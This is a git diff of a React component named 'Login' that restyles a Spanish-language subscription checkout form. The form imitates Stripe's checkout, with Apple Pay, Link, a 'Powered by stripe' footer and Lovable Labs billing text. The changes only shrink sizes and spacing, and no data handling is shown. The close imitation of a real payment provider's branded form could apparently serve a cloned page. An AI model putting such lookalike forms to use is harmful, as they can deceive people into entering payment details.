                 </div>
 
-                <label className="mt-[22px] flex cursor-pointer items-start gap-[13px] px-[13px]">
-                  <span className="relative mt-[3px] flex h-[20px] w-[20px] shrink-0 items-center justify-center">
+                <label className="mt-[17px] flex cursor-pointer items-start gap-[10px] px-[11px]">
+                  <span className="relative mt-[2px] flex h-[17px] w-[17px] shrink-0 items-center justify-center">
                     <input
                       type="checkbox"
                       checked={save}
                       onChange={(e) => setSave(e.target.checked)}
-                      className="peer h-[20px] w-[20px] cursor-pointer appearance-none rounded-[4px] border border-[#c9c9c9] bg-white transition-colors checked:border-[#111] checked:bg-[#111]"
+                      className="peer h-[17px] w-[17px] cursor-pointer appearance-none rounded-[3.5px] border border-[#c9c9c9] bg-white transition-colors checked:border-[#111] checked:bg-[#111]"
                     />
-                    <Check className="pointer-events-none absolute h-3 w-3 text-white opacity-0 peer-checked:opacity-100" strokeWidth={3.4} />
+                    <Check className="pointer-events-none absolute h-2.5 w-2.5 text-white opacity-0 peer-checked:opacity-100" strokeWidth={3.6} />
                   </span>
-                  <span className="text-[17px] leading-[1.42] text-[#1a1a1a]">
+                  <span className="text-[14.5px] leading-[1.4] text-[#1a1a1a]">
                     Guardar mi información de pago para futuras compras
                   </span>
                 </label>
 
-                <div className="mt-[18px] flex items-center gap-[17px] border-t border-[#e5e5e5] px-[13px] pb-[13px] pt-[18px]">
-                  <span className={`flex h-[15px] w-[15px] shrink-0 items-center justify-center rounded-full border bg-white ${method === "gpay" ? "border-[5.5px] border-[#111]" : "border-[1.5px] border-[#c9c9c9]"}`} aria-hidden="true" />
-                  <span className="flex items-center gap-[10px] text-[17px] text-[#1a1a1a]">
-                    <span className="flex h-[18px] items-center rounded-[3px] border border-[#111] bg-white px-[5px]">
-                      <AppleGlyph size={12} />
-                      <span className="ml-[1px] text-[12px] font-medium leading-none tracking-[-0.03em]">Pay</span>
+                <div className="mt-[14px] flex items-center gap-[13px] border-t border-[#e5e5e5] px-[11px] pb-[10px] pt-[14px]">
+                  <span className={`flex h-[13px] w-[13px] shrink-0 items-center justify-center rounded-full border bg-white ${method === "gpay" ? "border-[5px] border-[#111]" : "border-[1.5px] border-[#c9c9c9]"}`} aria-hidden="true" />
+                  <span className="flex items-center gap-2 text-[14.5px] text-[#1a1a1a]">
+                    <span className="flex h-[15px] items-center rounded-[2.5px] border border-[#111] bg-white px-[4px]">
+                      <AppleGlyph size={10} />
+                      <span className="ml-[1px] text-[10px] font-medium leading-none tracking-[-0.03em]">Pay</span>
                     </span>
                     Apple Pay
                   </span>
@@ -825,16 +823,16 @@ const Login = () => {
                 <p
                   role="alert"
                   style={{ animation: "vh-shake .3s ease-in-out" }}
-                  className="mt-3 flex items-start gap-1.5 text-[13.5px] leading-snug text-[#df1b41]"
+                  className="mt-2.5 flex items-start gap-1.5 text-[12.5px] leading-snug text-[#df1b41]"
                 >
-                  <AlertCircle className="mt-[1px] h-3.5 w-3.5 shrink-0" /> {error}
+                  <AlertCircle className="mt-[1px] h-3 w-3 shrink-0" /> {error}
                 </p>
               )}
 
-              <div className="mt-[22px] overflow-hidden rounded-[10px] border border-[#e5e5e5]">
-                <div className="px-[15px] pb-[15px] pt-[15px]">
-                  <p className="mb-[7px] text-[15.5px] text-[#1a1a1a]">Número de teléfono</p>
-                  <div className="flex h-[47px] items-center gap-[10px] rounded-[9px] border border-[#e5e5e5] pl-[11px] pr-[9px]">
+              <div className="mt-[17px] overflow-hidden rounded-[9px] border border-[#e5e5e5]">
+                <div className="px-[12px] pb-[12px] pt-[12px]">
+                  <p className="mb-[6px] text-[13.5px] text-[#1a1a1a]">Número de teléfono</p>
+                  <div className="flex h-[41px] items-center gap-2 rounded-[8px] border border-[#e5e5e5] pl-[9px] pr-[8px]">
                     <HnFlag />
                     <input
                       id="phone"
@@ -844,35 +842,35 @@ const Login = () => {
                       onChange={(e) => setPhone(e.target.value.replace(/[^\d-]/g, "").slice(0, 13))}
                       autoComplete="tel"
                       inputMode="tel"
-                      className="h-full min-w-0 flex-1 bg-transparent text-[17px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
+                      className="h-full min-w-0 flex-1 bg-transparent text-[15.5px] text-[#1a1a1a] outline-none placeholder:text-[#9b9b9b]"
                     />
-                    <span className="shrink-0 rounded-[6px] border border-[#dcdcdc] px-[9px] py-[6px] text-[15.5px] leading-none text-[#8a8a8a]">Opcional</span>
+                    <span className="shrink-0 rounded-[5px] border border-[#dcdcdc] px-[7px] py-[5px] text-[13px] leading-none text-[#8a8a8a]">Opcional</span>
                   </div>
                 </div>
-                <p className="border-t border-[#e5e5e5] px-[15px] py-[15px] text-[15.5px] leading-[1.6] text-[#1a1a1a]">
+                <p className="border-t border-[#e5e5e5] px-[12px] py-[12px] text-[13.5px] leading-[1.55] text-[#1a1a1a]">
                   Al proporcionar mi número de teléfono, acepto crear una cuenta y guardar mi información de pago en Link, sujeto a las{" "}
                   <span className="underline decoration-[#1a1a1a]/60 underline-offset-[3px]">Condiciones</span> y la{" "}
                   <span className="underline decoration-[#1a1a1a]/60 underline-offset-[3px]">Política de privacidad</span>.
                 </p>
               </div>
 
-              <p className="mt-[27px] px-[13px] text-center text-[16.5px] leading-[1.6] text-[#1a1a1a]">
+              <p className="mt-[21px] px-[11px] text-center text-[14px] leading-[1.55] text-[#1a1a1a]">
                 Si te suscribes, autorizas a Lovable Labs Incorporated a cobrarte en {currency} a la tasa de cambio indicada o a la tasa de cambio vigente en el momento de la facturación, de acuerdo con las condiciones hasta su cancelación.
               </p>
 
               <button
                 type="submit"
                 disabled={loading}
-                className="mt-[25px] flex h-[52px] w-full items-center justify-center rounded-[8px] bg-[#5b4ce0] text-[19px] font-medium text-white transition-all duration-150 hover:bg-[#4f42d0] active:scale-[0.995] disabled:opacity-70"
+                className="mt-[20px] flex h-[44px] w-full items-center justify-center rounded-[7px] bg-[#5b4ce0] text-[16px] font-medium text-white transition-all duration-150 hover:bg-[#4f42d0] active:scale-[0.995] disabled:opacity-70"
               >
                 Suscribirse
               </button>
 
-              <p className="mt-[26px] flex items-center justify-center gap-[18px] text-[17px] text-[#3f3f3f]">
-                <span className="flex items-center gap-[6px]">
-                  Powered by <span className="text-[19px] font-bold tracking-[-0.05em] text-[#1a1a1a]">stripe</span>
+              <p className="mt-[21px] flex items-center justify-center gap-[14px] text-[14px] text-[#3f3f3f]">
+                <span className="flex items-center gap-[5px]">
+                  Powered by <span className="text-[15.5px] font-bold tracking-[-0.05em] text-[#1a1a1a]">stripe</span>
                 </span>
-                <span className="h-[22px] w-px bg-[#d5d5d5]" />
+                <span className="h-[17px] w-px bg-[#d5d5d5]" />
                 <span>Condiciones</span>
                 <span>Privacidad</span>
               </p>
